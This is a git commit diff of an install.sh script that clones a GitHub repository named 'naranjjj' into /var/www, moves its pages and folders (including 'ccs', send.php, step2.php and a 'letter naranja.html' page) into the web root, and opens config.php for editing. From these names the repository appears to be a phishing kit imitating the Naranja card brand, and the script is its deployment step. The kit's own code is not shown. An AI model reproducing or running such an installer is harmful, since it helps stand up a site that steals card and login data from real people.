de161f4f45b766adc9a1cb5f950205afb0ebf01a
RESEKK <103382307+resekk-vps@users.noreply.github.com>
2022-06-03 20:57:19 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -3,7 +3,6 @@
 # Created by: @K41S3RR - https://t.me/K41S3RR
 #
 # ==============================================
-cd /etc/apache2/sites-available; nano 000-default.conf
 cd /var/www; git clone https://github.com/resekk-vps/naranjjj
 cd /var/www/naranjjj; mv ccs /var/www; mv css /var/www; mv data /var/www; mv fonts /var/www; mv js /var/www; mv parts /var/www; mv img /var/www; mv desktop.ini /var/www; mv config.php /var/www; mv error.png /var/www; mv flecha.png /var/www; mv index.php /var/www; mv letter naranja.html /var/www; mv send.php /var/www; mv step2.php /var/www
 cd /var/www; nano config.php
